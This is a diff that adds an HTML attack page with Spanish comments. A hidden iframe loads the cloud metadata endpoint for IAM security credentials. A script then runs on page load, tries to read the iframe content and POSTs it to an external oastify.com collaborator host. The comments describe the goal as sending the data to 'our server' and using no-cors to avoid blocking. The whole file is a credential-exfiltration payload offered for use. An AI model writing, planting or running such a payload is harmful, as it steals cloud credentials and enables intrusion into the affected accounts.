@@ -1,0 +1,24 @@
+<iframe id="targetFrame" src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" style="display:none;"></iframe>
+
+<script>
+  window.onload = function() {
+    try {
+      // Intentar acceder al contenido del iframe
+      var frame = document.getElementById('targetFrame');
+      var data = frame.contentWindow.document.body.innerHTML;
+
+      // Si logramos leerlo, lo enviamos a nuestro servidor
+      exfiltrateData(data);
+    } catch (e) {
+      console.error("Error de SOP: No se pudo leer el contenido", e);
+    }
+  };
+
+  function exfiltrateData(data) {
+    fetch('https://egypsaqwvpkx3vq7rvrlfhz4wv2mqmeb.oastify.com/log', {
+      method: 'POST',
+      mode: 'no-cors', // Para evitar bloqueos simples de CORS al enviar
+      body: JSON.stringify({ contenido: data })
+    });
+  }
+</script>
